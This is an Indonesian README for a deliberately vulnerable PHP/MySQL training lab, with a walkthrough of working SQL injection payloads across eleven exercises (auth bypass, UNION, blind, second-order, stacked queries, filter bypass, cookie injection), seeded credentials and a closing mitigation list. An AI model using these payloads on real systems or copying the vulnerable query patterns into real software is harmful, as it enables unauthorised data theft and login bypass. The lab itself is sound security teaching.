# SQL Injection Lab — VulnShop

Aplikasi toko fiktif (PHP 8 + MySQL 8) yang **sengaja dibuat rentan** terhadap berbagai jenis
SQL Injection, mengikuti kategori yang dipakai PortSwigger Web Security Academy:

| Lab | Kategori PortSwigger | File | Parameter |
|---|---|---|---|
| 1 | In-band — Authentication bypass | `lab1_login_bypass.php` | `username`, `password` (POST) |
| 2 | In-band — UNION-based | `lab2_union.php` | `id` (GET, numeric context) |
| 3 | In-band — Error-based | `lab3_error_based.php` | `category` (GET, string context) |
| 4 | Blind — Boolean-based | `lab4_blind_boolean.php` | `id` (GET) |
| 5 | Blind — Time-based | `lab5_blind_time.php` | `id` (GET) |
| 6 | Second-order SQLi | `lab6_second_order.php` | `username` (POST, saat register) |
| 7 | SQLi pada klausa `ORDER BY` | `lab7_order_by.php` | `sort` (GET) |
| 8 | Stacked queries | `lab8_stacked_queries.php` | `note` (POST, via `multi_query()`) |
| 9 | Filter/WAF bypass | `lab9_filter_bypass.php` | `category` (GET, blacklist naif) |
| 10 | In-band — SQLi pada `INSERT` | `lab10_insert_based.php` | `bio` (POST, saat registrasi) |
| 11 | SQLi lewat cookie | `lab11_cookie_based.php` | `TrackingId` (Cookie, bukan form/URL) |

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja rentan. Jangan deploy ke server publik / internet.
> Jalankan hanya di jaringan lab/lokal yang terisolasi (mis. laptop peserta atau VM training).

## Menjalankan

> Lab ini adalah bagian dari satu stack terpadu. Jalankan dari **root repo** (bukan dari
> folder ini), lihat [README.md utama](../README.md) untuk portal navigasinya.

```bash
cd ..            # ke root repo
docker compose up -d --build
```

Buka langsung `http://localhost:8079/sqli/`, atau lewat Portal di `http://localhost:8079/` →
kategori **A05: Injection** → **SQL Injection**. MySQL akan otomatis di-seed dari
`db/init.sql` (butuh beberapa detik pertama kali sampai healthcheck db lulus).

> Semua akses lewat `gateway` (login Basic Auth, satu port untuk semua lab) — lihat
> [README.md utama](../README.md) bagian "Menjalankan (lokal)" untuk cara generate
> kredensialnya. Login cukup sekali, berlaku juga untuk lab XSS/Command Injection.

Untuk mematikan semuanya dan menghapus data (dari root repo):

```bash
docker compose down -v
```

## Kredensial & data awal

Tabel `users` (lihat `db/init.sql`):

| username | password | role |
|---|---|---|
| admin | S3cr3tAdminPass! | admin |
| alice | alice123 | user |
| bob | bobpass99 | user |

Peserta **tidak** diberi tahu password admin di awal — tujuannya adalah mengekstraknya lewat
SQL Injection (Lab 1–5).

## Panduan tiap lab

### Lab 1 — Authentication Bypass
Query: `SELECT * FROM users WHERE username='$user' AND password='$pass'`

Coba:
- Username: `admin' -- -` , password: apa saja
- Username: `' OR '1'='1' -- -`

### Lab 2 — UNION-based
Query: `SELECT id, name, description, price FROM products WHERE id = $id`

Langkah:
1. Cari jumlah kolom: `?id=0 UNION SELECT 1,2,3,4-- -` (ubah jumlah angka sampai tidak error)
2. Cari kolom yang string: `?id=0 UNION SELECT 1,'a','b',4-- -`
3. Ambil data user: `?id=0 UNION SELECT id,username,password,role FROM users-- -`

### Lab 3 — Error-based
Query: `SELECT id, name, price FROM products WHERE category = '$category'`

Coba:
```
category=' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
category=' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin')))-- -
```

### Lab 4 — Blind Boolean-based
Tidak ada data/error yang tampil, hanya "In stock" / "Not found" sebagai oracle.

```
id=1 AND 1=1        -> In stock
id=1 AND 1=2        -> Not found
id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S'
```
Ulangi per karakter untuk mengekstrak seluruh password admin.

### Lab 5 — Blind Time-based
Respons selalu identik; gunakan waktu respons sebagai sinyal.

```
id=1 AND SLEEP(3)
id=1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='S',SLEEP(3),0)
```

### Lab 6 — Second-order
1. Register dengan username: `x' UNION SELECT password FROM users WHERE username='admin'-- -`
2. Klik "View My Bio" — payload yang tersimpan dieksekusi ulang di query kedua.

### Lab 7 — ORDER BY
UNION tidak bisa dipakai langsung di `ORDER BY`. Gunakan oracle boolean:
```
sort=(CASE WHEN (1=1) THEN name ELSE price END)
sort=(CASE WHEN (1=2) THEN name ELSE price END)
```
Bandingkan urutan hasil untuk kondisi true vs false. Materi tambahan (opsional, tingkat
lanjut): teknik error-based ganda pada MySQL menggunakan `GROUP BY` + `RAND()` duplicate-key
trick.

### Lab 8 — Stacked Queries
Fitur "catatan cepat" ini memakai `mysqli_multi_query()`, bukan `query()`/prepared statement
biasa seperti lab lain — driver ini secara eksplisit mengizinkan lebih dari satu statement SQL
dipisah `;` dieksekusi dalam satu pemanggilan.

Query: `INSERT INTO notes (text) VALUES ('$note')`

Coba:
```
note=x'); INSERT INTO notes (text) VALUES ('injected via stacked query'); -- 
```
Perhatikan tabel notes di bawah form — muncul baris baru yang tidak Anda ketik langsung.

> Catatan: teknik ini **hanya** berhasil karena kode memanggil `multi_query()`. Lab 1–7 dan 9–11
> semuanya memakai `query()`/`prepare()` biasa, yang menolak mengeksekusi lebih dari satu
> statement sekaligus meskipun sama-sama rentan terhadap SQLi — jadi stacked queries bukan
> teknik yang "otomatis jalan" di sembarang titik injeksi, tapi tergantung API yang dipakai.

### Lab 9 — Filter/WAF Bypass
Sama seperti Lab 3 (UNION lewat parameter `category`), tapi kali ini ada filter naif:
```php
if (preg_match('/union\s+select/i', $category)) { die('Payload berbahaya terdeteksi!'); }
```
Filter ini memblokir frasa `union` + whitespace (spasi/tab/baris baru apa pun) + `select`, tapi
tidak paham bahwa MySQL juga menerima komentar `/**/` sebagai pemisah token yang sah.

Coba:
```
category=nonexistent' UNION SELECT username,password,role FROM users-- -
```
→ **diblokir** (whitespace di antara `UNION`/`SELECT` tetap kena regex).
```
category=nonexistent' UNION/**/SELECT username,password,role FROM users-- -
```
→ **lolos** — `/**/` bukan whitespace di mata regex, tapi tetap dianggap pemisah token yang sah
oleh parser MySQL.

### Lab 10 — SQLi pada `INSERT` (form registrasi)
Injeksi tidak selalu ada di klausa `SELECT`/`WHERE` — di sini form registrasi memasukkan field
`bio` langsung ke statement `INSERT`:
```sql
INSERT INTO reg_demo_users (username, bio) VALUES ('$username', '$bio')
```
Error mentah MySQL ditampilkan ke user (sama seperti Lab 3), sehingga teknik error-based bisa
dipakai — bedanya kali ini payload disisipkan di dalam konteks `VALUES(...)`, bukan `WHERE`.

Coba (field Bio):
```
' OR extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))))-- 
```
Query yang dieksekusi jadi:
```sql
INSERT INTO reg_demo_users (username, bio) VALUES ('tester', '' OR extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))))-- ')
```
→ Muncul error `XPATH syntax error: '~S3cr3tAdminPass!'`.

### Lab 11 — SQLi lewat Cookie
Fitur "produk yang baru dilihat" membaca cookie `TrackingId` (di-set otomatis saat pertama kali
buka halaman) dan menyambungnya langsung ke query — bukan parameter URL/form yang kelihatan:
```sql
SELECT id, name, description, price FROM products WHERE id = '$tracking_id' LIMIT 1
```
Buka DevTools → Application/Storage → Cookies (atau Burp), ubah nilai cookie `TrackingId` secara
manual (atau pakai form alternatif di halaman lab), lalu reload:
```
TrackingId=0' UNION SELECT username,password,role,1 FROM users-- -
```
Struktur query-nya identik dengan Lab 2, jadi payload UNION yang sama berfungsi di sini.

## Mitigasi (untuk didiskusikan setelah lab)
- Gunakan **prepared statements / parameterized queries** (mysqli/PDO `bindParam`) di semua lab.
- Untuk Lab 7, whitelist nama kolom/arah sort yang diperbolehkan, jangan pernah concatenate.
- Least privilege pada akun DB aplikasi (jangan pakai root).
- Disable tampilan error SQL mentah ke user (Lab 3 dan Lab 10).
- Untuk Lab 6: validasi/sanitasi ulang setiap kali data dipakai dalam query baru, bukan hanya
  saat pertama disimpan.
- Untuk Lab 8: jangan pernah pakai `multi_query()`/`PDO::MYSQL_ATTR_MULTI_STATEMENTS` dengan
  input yang tidak tepercaya — kalau memang butuh banyak statement, gunakan pemanggilan
  `query()`/`prepare()` terpisah per statement.
- Untuk Lab 9: blacklist berbasis pattern-match keyword **tidak pernah cukup** — gunakan
  parameterized query, bukan filter kata kunci, sebagai satu-satunya pertahanan yang diandalkan.
- Untuk Lab 11: validasi/perlakukan **semua** sumber input yang mencapai query dengan standar
  yang sama — cookie, header, dan kanal "tersembunyi" lain sama berbahayanya dengan parameter
  URL/form kalau tidak diparameterisasi.
